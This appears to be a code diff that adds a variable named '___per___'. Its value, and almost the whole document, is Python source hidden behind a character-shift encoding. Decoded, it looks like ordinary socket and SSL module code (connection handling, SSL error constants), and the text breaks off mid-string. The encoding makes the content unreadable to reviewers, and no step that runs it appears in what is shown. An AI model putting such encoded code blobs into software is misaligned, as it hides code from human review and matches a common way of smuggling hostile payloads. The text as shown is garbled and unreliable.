ꛬꛮ꛶꛷꛺꛲ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹ꛷꛴꛾꛿꛰꛹ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹ꛷꛴꛾꛿꛰꛹ꚳꛭꛬꛮ꛶꛷꛺꛲ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛺ꛮ꛶ꚕꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫ꛰꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹꛮ꛷꛺꛾꛰ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚕꚕꚕꛯ꛰꛱ꚫ꛲꛰꛿ꛬꛯꛯ꛽꛴꛹꛱꛺ꚳ꛳꛺꛾꛿ꚷꚫ꛻꛺꛽꛿ꚷꚫ꛱ꛬ꛸꛴꛷꜄ꛈꚻꚷꚫ꛿꜄꛻꛰ꛈꚻꚷꚫ꛻꛽꛺꛿꛺ꛈꚻꚷꚫ꛱꛷ꛬ꛲꛾ꛈꚻꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛝ꛰꛾꛺꛷꜁꛰ꚫ꛳꛺꛾꛿ꚫꛬ꛹ꛯꚫ꛻꛺꛽꛿ꚫ꛴꛹꛿꛺ꚫ꛷꛴꛾꛿ꚫ꛺꛱ꚫꛬꛯꛯ꛽꛰꛾꛾ꚫ꛴꛹꛱꛺ꚫ꛰꛹꛿꛽꛴꛰꛾ꚹꚕꚕꚫꚫꚫꚫꛟ꛽ꛬ꛹꛾꛷ꛬ꛿꛰ꚫ꛿꛳꛰ꚫ꛳꛺꛾꛿ꚺ꛻꛺꛽꛿ꚫꛬ꛽꛲꜀꛸꛰꛹꛿ꚫ꛴꛹꛿꛺ꚫꛬꚫ꛾꛰꛼꜀꛰꛹ꛮ꛰ꚫ꛺꛱ꚫꛀꚸ꛿꜀꛻꛷꛰꛾ꚫ꛿꛳ꛬ꛿ꚫꛮ꛺꛹꛿ꛬ꛴꛹ꚕꚫꚫꚫꚫꛬ꛷꛷ꚫ꛿꛳꛰ꚫ꛹꛰ꛮ꛰꛾꛾ꛬ꛽꜄ꚫꛬ꛽꛲꜀꛸꛰꛹꛿꛾ꚫ꛱꛺꛽ꚫꛮ꛽꛰ꛬ꛿꛴꛹꛲ꚫꛬꚫ꛾꛺ꛮ꛶꛰꛿ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚫ꛿꛺ꚫ꛿꛳ꛬ꛿ꚫ꛾꛰꛽꜁꛴ꛮ꛰ꚹꚕꚫꚫꚫꚫ꛳꛺꛾꛿ꚫ꛴꛾ꚫꛬꚫꛯ꛺꛸ꛬ꛴꛹ꚫ꛹ꛬ꛸꛰ꚷꚫꛬꚫ꛾꛿꛽꛴꛹꛲ꚫ꛽꛰꛻꛽꛰꛾꛰꛹꛿ꛬ꛿꛴꛺꛹ꚫ꛺꛱ꚫꛬ꛹ꚫꛔꛛ꜁ꚿꚺ꜁ꛁꚫꛬꛯꛯ꛽꛰꛾꛾ꚫ꛺꛽ꚕꚫꚫꚫꚫꛙ꛺꛹꛰ꚹꚫ꛻꛺꛽꛿ꚫ꛴꛾ꚫꛬꚫ꛾꛿꛽꛴꛹꛲ꚫ꛾꛰꛽꜁꛴ꛮ꛰ꚫ꛹ꛬ꛸꛰ꚫ꛾꜀ꛮ꛳ꚫꛬ꛾ꚫꚲ꛳꛿꛿꛻ꚲꚷꚫꛬꚫ꛹꜀꛸꛰꛽꛴ꛮꚫ꛻꛺꛽꛿ꚫ꛹꜀꛸ꛭ꛰꛽ꚫ꛺꛽ꚕꚫꚫꚫꚫꛙ꛺꛹꛰ꚹꚫꛍ꜄ꚫ꛻ꛬ꛾꛾꛴꛹꛲ꚫꛙ꛺꛹꛰ꚫꛬ꛾ꚫ꛿꛳꛰ꚫ꜁ꛬ꛷꜀꛰ꚫ꛺꛱ꚫ꛳꛺꛾꛿ꚫꛬ꛹ꛯꚫ꛻꛺꛽꛿ꚷꚫ꜄꛺꜀ꚫꛮꛬ꛹ꚫ꛻ꛬ꛾꛾ꚫꛙꛠꛗꛗꚫ꛿꛺ꚕꚫꚫꚫꚫ꛿꛳꛰ꚫ꜀꛹ꛯ꛰꛽꛷꜄꛴꛹꛲ꚫꛎꚫꛌꛛꛔꚹꚕꚕꚫꚫꚫꚫꛟ꛳꛰ꚫ꛱ꛬ꛸꛴꛷꜄ꚷꚫ꛿꜄꛻꛰ꚫꛬ꛹ꛯꚫ꛻꛽꛺꛿꛺ꚫꛬ꛽꛲꜀꛸꛰꛹꛿꛾ꚫꛮꛬ꛹ꚫꛭ꛰ꚫ꛺꛻꛿꛴꛺꛹ꛬ꛷꛷꜄ꚫ꛾꛻꛰ꛮ꛴꛱꛴꛰ꛯꚫ꛴꛹ꚫ꛺꛽ꛯ꛰꛽ꚫ꛿꛺ꚕꚫꚫꚫꚫ꛹ꛬ꛽꛽꛺꜂ꚫ꛿꛳꛰ꚫ꛷꛴꛾꛿ꚫ꛺꛱ꚫꛬꛯꛯ꛽꛰꛾꛾꛰꛾ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚹꚫꛛꛬ꛾꛾꛴꛹꛲ꚫ꜅꛰꛽꛺ꚫꛬ꛾ꚫꛬꚫ꜁ꛬ꛷꜀꛰ꚫ꛱꛺꛽ꚫ꛰ꛬꛮ꛳ꚫ꛺꛱ꚕꚫꚫꚫꚫ꛿꛳꛰꛾꛰ꚫꛬ꛽꛲꜀꛸꛰꛹꛿꛾ꚫ꛾꛰꛷꛰ꛮ꛿꛾ꚫ꛿꛳꛰ꚫ꛱꜀꛷꛷ꚫ꛽ꛬ꛹꛲꛰ꚫ꛺꛱ꚫ꛽꛰꛾꜀꛷꛿꛾ꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚮꚫꛢ꛰ꚫ꛺꜁꛰꛽꛽꛴ꛯ꛰ꚫ꛿꛳꛴꛾ꚫ꛱꜀꛹ꛮ꛿꛴꛺꛹ꚫ꛾꛴꛹ꛮ꛰ꚫ꜂꛰ꚫ꜂ꛬ꛹꛿ꚫ꛿꛺ꚫ꛿꛽ꛬ꛹꛾꛷ꛬ꛿꛰ꚫ꛿꛳꛰ꚫ꛹꜀꛸꛰꛽꛴ꛮꚫ꛱ꛬ꛸꛴꛷꜄ꚕꚫꚫꚫꚫꚮꚫꛬ꛹ꛯꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛿꜄꛻꛰ꚫ꜁ꛬ꛷꜀꛰꛾ꚫ꛿꛺ꚫ꛰꛹꜀꛸ꚫꛮ꛺꛹꛾꛿ꛬ꛹꛿꛾ꚹꚕꚫꚫꚫꚫꛬꛯꛯ꛽꛷꛴꛾꛿ꚫꛈꚫꛦꛨꚕꚫꚫꚫꚫ꛱꛺꛽ꚫ꛽꛰꛾ꚫ꛴꛹ꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚹ꛲꛰꛿ꛬꛯꛯ꛽꛴꛹꛱꛺ꚳ꛳꛺꛾꛿ꚷꚫ꛻꛺꛽꛿ꚷꚫ꛱ꛬ꛸꛴꛷꜄ꚷꚫ꛿꜄꛻꛰ꚷꚫ꛻꛽꛺꛿꛺ꚷꚫ꛱꛷ꛬ꛲꛾ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛬ꛱ꚷꚫ꛾꛺ꛮ꛶꛿꜄꛻꛰ꚷꚫ꛻꛽꛺꛿꛺ꚷꚫꛮꛬ꛹꛺꛹꛹ꛬ꛸꛰ꚷꚫ꛾ꛬꚫꛈꚫ꛽꛰꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛬꛯꛯ꛽꛷꛴꛾꛿ꚹꛬ꛻꛻꛰꛹ꛯꚳꚳꛪ꛴꛹꛿꛰꛹꜀꛸ꛪꛮ꛺꛹꜁꛰꛽꛿꛰꛽ꚳꛬ꛱ꚷꚫꛌꛯꛯ꛽꛰꛾꛾ꛑꛬ꛸꛴꛷꜄ꚴꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛪ꛴꛹꛿꛰꛹꜀꛸ꛪꛮ꛺꛹꜁꛰꛽꛿꛰꛽ꚳ꛾꛺ꛮ꛶꛿꜄꛻꛰ꚷꚫꛞ꛺ꛮ꛶꛰꛿ꛖ꛴꛹ꛯꚴꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻꛽꛺꛿꛺ꚷꚫꛮꛬ꛹꛺꛹꛹ꛬ꛸꛰ꚷꚫ꛾ꛬꚴꚴꚕꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛬꛯꛯ꛽꛷꛴꛾꛿ꚕ'
+___per___ = 'ꚮꚫꛢ꛽ꛬ꛻꛻꛰꛽ꚫ꛸꛺ꛯ꜀꛷꛰ꚫ꛱꛺꛽ꚫꛪ꛾꛾꛷ꚷꚫ꛻꛽꛺꜁꛴ꛯ꛴꛹꛲ꚫ꛾꛺꛸꛰ꚫꛬꛯꛯ꛴꛿꛴꛺꛹ꛬ꛷ꚫ꛱ꛬꛮ꛴꛷꛴꛿꛴꛰꛾ꚕꚮꚫ꛴꛸꛻꛷꛰꛸꛰꛹꛿꛰ꛯꚫ꛴꛹ꚫꛛ꜄꛿꛳꛺꛹ꚹꚫꚫꛢ꛽꛴꛿꛿꛰꛹ꚫꛭ꜄ꚫꛍ꛴꛷꛷ꚫꛕꛬ꛹꛾꛾꛰꛹ꚹꚕꚕꚭꚭꚭꛟ꛳꛴꛾ꚫ꛸꛺ꛯ꜀꛷꛰ꚫ꛻꛽꛺꜁꛴ꛯ꛰꛾ꚫ꛾꛺꛸꛰ꚫ꛸꛺꛽꛰ꚫꛛ꜄꛿꛳꛺꛹꛴ꛮꚫ꛾꜀꛻꛻꛺꛽꛿ꚫ꛱꛺꛽ꚫꛞꛞꛗꚹꚕꚕꛚꛭ꛵꛰ꛮ꛿ꚫ꛿꜄꛻꛰꛾ꛅꚕꚕꚫꚫꛞꛞꛗꛞ꛺ꛮ꛶꛰꛿ꚫꚸꚸꚫ꛾꜀ꛭ꛿꜄꛻꛰ꚫ꛺꛱ꚫ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛺ꛮ꛶꛰꛿ꚫ꜂꛳꛴ꛮ꛳ꚫꛯ꛺꛰꛾ꚫꛞꛞꛗꚫ꛺꜁꛰꛽ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚕꚕꛐ꜃ꛮ꛰꛻꛿꛴꛺꛹꛾ꛅꚕꚕꚫꚫꛞꛞꛗꛐ꛽꛽꛺꛽ꚫꚸꚸꚫ꛰꜃ꛮ꛰꛻꛿꛴꛺꛹ꚫ꛽ꛬ꛴꛾꛰ꛯꚫ꛱꛺꛽ꚫꛔꚺꛚꚫ꛰꛽꛽꛺꛽꛾ꚕꚕꛑ꜀꛹ꛮ꛿꛴꛺꛹꛾ꛅꚕꚕꚫꚫꛮ꛰꛽꛿ꛪ꛿꛴꛸꛰ꛪ꛿꛺ꛪ꛾꛰ꛮ꛺꛹ꛯ꛾ꚫꚸꚸꚫꛮ꛺꛹꜁꛰꛽꛿ꚫ꛿꛴꛸꛰ꚫ꛾꛿꛽꛴꛹꛲ꚫ꜀꛾꛰ꛯꚫ꛱꛺꛽ꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛹꛺꛿ꛍ꛰꛱꛺꛽꛰ꚫꛬ꛹ꛯꚫ꛹꛺꛿ꛌ꛱꛿꛰꛽ꚫ꛱꜀꛹ꛮ꛿꛴꛺꛹꛾ꚫ꛿꛺ꚫ꛴꛹꛿꛰꛲꛰꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰ꛮ꛺꛹ꛯ꛾ꚫ꛻ꛬ꛾꛿ꚫ꛿꛳꛰ꚫꛐ꛻꛺ꛮ꛳ꚫꚳ꛿꛳꛰ꚫ꛿꛴꛸꛰ꚫ꜁ꛬ꛷꜀꛰꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚫ꛱꛽꛺꛸ꚫ꛿꛴꛸꛰ꚹ꛿꛴꛸꛰ꚳꚴꚴꚕꚕꚫꚫ꛲꛰꛿ꛪ꛾꛰꛽꜁꛰꛽ꛪꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꚫꚳꛬꛯꛯ꛽ꚷꚫ꛾꛾꛷ꛪ꜁꛰꛽꛾꛴꛺꛹ꚷꚫꛮꛬꛪꛮ꛰꛽꛿꛾ꚷꚫ꛿꛴꛸꛰꛺꜀꛿ꚴꚫꚸꚸꚫꛝ꛰꛿꛽꛴꛰꜁꛰ꚫ꛿꛳꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꚫ꛱꛽꛺꛸ꚫ꛿꛳꛰ꚫ꛾꛰꛽꜁꛰꛽ꚫꛬ꛿ꚫ꛿꛳꛰ꚫ꛾꛻꛰ꛮ꛴꛱꛴꛰ꛯꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛬꛯꛯ꛽꛰꛾꛾ꚫꛬ꛹ꛯꚫ꛽꛰꛿꜀꛽꛹ꚫ꛴꛿ꚫꛬ꛾ꚫꛬꚫꛛꛐꛘꚸ꛰꛹ꛮ꛺ꛯ꛰ꛯꚫ꛾꛿꛽꛴꛹꛲ꚕꚕꚕꛔ꛹꛿꛰꛲꛰꛽ꚫꛮ꛺꛹꛾꛿ꛬ꛹꛿꛾ꛅꚕꚕꛞꛞꛗꛪꛐꛝꛝꛚꛝꛪꛥꛐꛝꛚꛪꛝꛐꛟꛠꛝꛙꚕꛞꛞꛗꛪꛐꛝꛝꛚꛝꛪꛢꛌꛙꛟꛪꛝꛐꛌꛏꚕꛞꛞꛗꛪꛐꛝꛝꛚꛝꛪꛢꛌꛙꛟꛪꛢꛝꛔꛟꛐꚕꛞꛞꛗꛪꛐꛝꛝꛚꛝꛪꛢꛌꛙꛟꛪꛣꛀꚻꛄꛪꛗꛚꛚꛖꛠꛛꚕꛞꛞꛗꛪꛐꛝꛝꛚꛝꛪꛞꛤꛞꛎꛌꛗꛗꚕꛞꛞꛗꛪꛐꛝꛝꛚꛝꛪꛞꛞꛗꚕꛞꛞꛗꛪꛐꛝꛝꛚꛝꛪꛢꛌꛙꛟꛪꛎꛚꛙꛙꛐꛎꛟꚕꚕꛞꛞꛗꛪꛐꛝꛝꛚꛝꛪꛐꛚꛑꚕꛞꛞꛗꛪꛐꛝꛝꛚꛝꛪꛔꛙꛡꛌꛗꛔꛏꛪꛐꛝꛝꛚꛝꛪꛎꛚꛏꛐꚕꚕꛟ꛳꛰ꚫ꛱꛺꛷꛷꛺꜂꛴꛹꛲ꚫ꛲꛽꛺꜀꛻ꚫꛯ꛰꛱꛴꛹꛰ꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꚫ꛽꛰꛼꜀꛴꛽꛰꛸꛰꛹꛿꛾ꚫ꛿꛳ꛬ꛿ꚫ꛺꛹꛰ꚫ꛾꛴ꛯ꛰ꚫ꛴꛾ꚕꛬ꛷꛷꛺꜂꛴꛹꛲ꚺ꛽꛰꛼꜀꛴꛽꛴꛹꛲ꚫ꛱꛽꛺꛸ꚫ꛿꛳꛰ꚫ꛺꛿꛳꛰꛽ꚫ꛾꛴ꛯ꛰ꛅꚕꚕꛎꛐꛝꛟꛪꛙꛚꛙꛐꚫꚸꚫ꛹꛺ꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰꛾ꚫ꛱꛽꛺꛸ꚫ꛿꛳꛰ꚫ꛺꛿꛳꛰꛽ꚫ꛾꛴ꛯ꛰ꚫꛬ꛽꛰ꚫ꛽꛰꛼꜀꛴꛽꛰ꛯꚫꚳ꛺꛽ꚫ꜂꛴꛷꛷ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꛰ꚫ꛷꛺꛺꛶꛰ꛯꚫꛬ꛿ꚫ꛴꛱ꚫ꛻꛽꛺꜁꛴ꛯ꛰ꛯꚴꚕꛎꛐꛝꛟꛪꛚꛛꛟꛔꛚꛙꛌꛗꚫꚸꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰꛾ꚫꛬ꛽꛰ꚫ꛹꛺꛿ꚫ꛽꛰꛼꜀꛴꛽꛰ꛯꚷꚫꛭ꜀꛿ꚫ꛴꛱ꚫ꛻꛽꛺꜁꛴ꛯ꛰ꛯꚫ꜂꛴꛷꛷ꚫꛭ꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꜁ꛬ꛷꛴ꛯꛬ꛿꛰ꛯꚷꚫꛬ꛹ꛯꚫ꛴꛱ꚫ꜁ꛬ꛷꛴ꛯꛬ꛿꛴꛺꛹ꚫ꛱ꛬ꛴꛷꛾ꚷꚫ꛿꛳꛰ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚫ꜂꛴꛷꛷ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛬ꛷꛾꛺ꚫ꛱ꛬ꛴꛷ꚕꛎꛐꛝꛟꛪꛝꛐꛜꛠꛔꛝꛐꛏꚫꚸꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰꛾ꚫꛬ꛽꛰ꚫ꛽꛰꛼꜀꛴꛽꛰ꛯꚷꚫꛬ꛹ꛯꚫ꜂꛴꛷꛷ꚫꛭ꛰ꚫ꜁ꛬ꛷꛴ꛯꛬ꛿꛰ꛯꚷꚫꛬ꛹ꛯꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꜁ꛬ꛷꛴ꛯꛬ꛿꛴꛺꛹ꚫ꛱ꛬ꛴꛷꛾ꚷꚫ꛿꛳꛰ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚫ꜂꛴꛷꛷ꚫꛬ꛷꛾꛺ꚫ꛱ꛬ꛴꛷ꚕꚕꛟ꛳꛰ꚫ꛱꛺꛷꛷꛺꜂꛴꛹꛲ꚫꛮ꛺꛹꛾꛿ꛬ꛹꛿꛾ꚫ꛴ꛯ꛰꛹꛿꛴꛱꜄ꚫ꜁ꛬ꛽꛴꛺꜀꛾ꚫꛞꛞꛗꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫ꜁ꛬ꛽꛴ꛬ꛹꛿꛾ꛅꚕꚕꛛꛝꛚꛟꛚꛎꛚꛗꛪꛞꛞꛗ꜁ꚽꚕꛛꛝꛚꛟꛚꛎꛚꛗꛪꛞꛞꛗ꜁ꚾꚕꛛꛝꛚꛟꛚꛎꛚꛗꛪꛞꛞꛗ꜁ꚽꚾꚕꛛꛝꛚꛟꛚꛎꛚꛗꛪꛟꛗꛞꚕꛛꛝꛚꛟꛚꛎꛚꛗꛪꛟꛗꛞꛪꛎꛗꛔꛐꛙꛟꚕꛛꛝꛚꛟꛚꛎꛚꛗꛪꛟꛗꛞꛪꛞꛐꛝꛡꛐꛝꚕꛛꛝꛚꛟꛚꛎꛚꛗꛪꛟꛗꛞ꜁ꚼꚕꛛꛝꛚꛟꛚꛎꛚꛗꛪꛟꛗꛞ꜁ꚼꛪꚼꚕꛛꛝꛚꛟꛚꛎꛚꛗꛪꛟꛗꛞ꜁ꚼꛪꚽꚕꚕꛟ꛳꛰ꚫ꛱꛺꛷꛷꛺꜂꛴꛹꛲ꚫꛮ꛺꛹꛾꛿ꛬ꛹꛿꛾ꚫ꛴ꛯ꛰꛹꛿꛴꛱꜄ꚫ꜁ꛬ꛽꛴꛺꜀꛾ꚫꛞꛞꛗꚫꛬ꛷꛰꛽꛿ꚫ꛸꛰꛾꛾ꛬ꛲꛰ꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛴꛺꛹꛾ꚫꛬ꛾ꚫ꛻꛰꛽ꚕ꛳꛿꛿꛻ꛅꚺꚺ꜂꜂꜂ꚹ꛴ꛬ꛹ꛬꚹ꛺꛽꛲ꚺꛬ꛾꛾꛴꛲꛹꛸꛰꛹꛿꛾ꚺ꛿꛷꛾ꚸ꛻ꛬ꛽ꛬ꛸꛰꛿꛰꛽꛾ꚺ꛿꛷꛾ꚸ꛻ꛬ꛽ꛬ꛸꛰꛿꛰꛽꛾ꚹ꜃꛸꛷ꚮ꛿꛷꛾ꚸ꛻ꛬ꛽ꛬ꛸꛰꛿꛰꛽꛾ꚸꛁꚕꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛎꛗꛚꛞꛐꛪꛙꛚꛟꛔꛑꛤꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛠꛙꛐꛣꛛꛐꛎꛟꛐꛏꛪꛘꛐꛞꛞꛌꛒꛐꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛍꛌꛏꛪꛝꛐꛎꛚꛝꛏꛪꛘꛌꛎꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛝꛐꛎꛚꛝꛏꛪꛚꛡꛐꛝꛑꛗꛚꛢꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛏꛐꛎꛚꛘꛛꛝꛐꛞꛞꛔꛚꛙꛪꛑꛌꛔꛗꛠꛝꛐꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛓꛌꛙꛏꛞꛓꛌꛖꛐꛪꛑꛌꛔꛗꛠꛝꛐꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛍꛌꛏꛪꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛠꛙꛞꛠꛛꛛꛚꛝꛟꛐꛏꛪꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛝꛐꛡꛚꛖꛐꛏꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛐꛣꛛꛔꛝꛐꛏꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛠꛙꛖꛙꛚꛢꛙꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛔꛗꛗꛐꛒꛌꛗꛪꛛꛌꛝꛌꛘꛐꛟꛐꛝꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛠꛙꛖꛙꛚꛢꛙꛪꛎꛌꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛌꛎꛎꛐꛞꛞꛪꛏꛐꛙꛔꛐꛏꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛏꛐꛎꛚꛏꛐꛪꛐꛝꛝꛚꛝꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛏꛐꛎꛝꛤꛛꛟꛪꛐꛝꛝꛚꛝꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛛꛝꛚꛟꛚꛎꛚꛗꛪꛡꛐꛝꛞꛔꛚꛙꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛔꛙꛞꛠꛑꛑꛔꛎꛔꛐꛙꛟꛪꛞꛐꛎꛠꛝꛔꛟꛤꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛔꛙꛟꛐꛝꛙꛌꛗꛪꛐꛝꛝꛚꛝꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛠꛞꛐꛝꛪꛎꛌꛙꛎꛐꛗꛗꛐꛏꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛙꛚꛪꛝꛐꛙꛐꛒꛚꛟꛔꛌꛟꛔꛚꛙꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛠꛙꛞꛠꛛꛛꛚꛝꛟꛐꛏꛪꛐꛣꛟꛐꛙꛞꛔꛚꛙꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛠꛙꛚꛍꛟꛌꛔꛙꛌꛍꛗꛐꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛠꛙꛝꛐꛎꛚꛒꛙꛔꛥꛐꛏꛪꛙꛌꛘꛐꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛍꛌꛏꛪꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛞꛟꛌꛟꛠꛞꛪꛝꛐꛞꛛꛚꛙꛞꛐꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛍꛌꛏꛪꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛓꛌꛞꛓꛪꛡꛌꛗꛠꛐꚕꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꛠꛙꛖꛙꛚꛢꛙꛪꛛꛞꛖꛪꛔꛏꛐꛙꛟꛔꛟꛤꚕꚭꚭꚭꚕꚕ꛴꛸꛻꛺꛽꛿ꚫ꛾꜄꛾ꚕ꛴꛸꛻꛺꛽꛿ꚫ꛺꛾ꚕ꛱꛽꛺꛸ꚫꛮ꛺꛷꛷꛰ꛮ꛿꛴꛺꛹꛾ꚫ꛴꛸꛻꛺꛽꛿ꚫ꛹ꛬ꛸꛰ꛯ꛿꜀꛻꛷꛰ꚕ꛱꛽꛺꛸ꚫ꛰꛹꜀꛸ꚫ꛴꛸꛻꛺꛽꛿ꚫꛐ꛹꜀꛸ꚫꛬ꛾ꚫꛪꛐ꛹꜀꛸ꚷꚫꛔ꛹꛿ꛐ꛹꜀꛸ꚫꛬ꛾ꚫꛪꛔ꛹꛿ꛐ꛹꜀꛸ꚷꚫꛔ꛹꛿ꛑ꛷ꛬ꛲ꚫꛬ꛾ꚫꛪꛔ꛹꛿ꛑ꛷ꛬ꛲ꚕ꛱꛽꛺꛸ꚫ꛰꛹꜀꛸ꚫ꛴꛸꛻꛺꛽꛿ꚫꛪ꛾꛴꛸꛻꛷꛰ꛪ꛰꛹꜀꛸ꚕꚕ꛴꛸꛻꛺꛽꛿ꚫꛪ꛾꛾꛷ꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛴꛱ꚫ꜂꛰ꚫꛮꛬ꛹ꚲ꛿ꚫ꛴꛸꛻꛺꛽꛿ꚫ꛴꛿ꚷꚫ꛷꛰꛿ꚫ꛿꛳꛰ꚫ꛰꛽꛽꛺꛽ꚫ꛻꛽꛺꛻ꛬ꛲ꛬ꛿꛰ꚕꚕ꛱꛽꛺꛸ꚫꛪ꛾꛾꛷ꚫ꛴꛸꛻꛺꛽꛿ꚫꛚꛛꛐꛙꛞꛞꛗꛪꛡꛐꛝꛞꛔꛚꛙꛪꛙꛠꛘꛍꛐꛝꚷꚫꛚꛛꛐꛙꛞꛞꛗꛪꛡ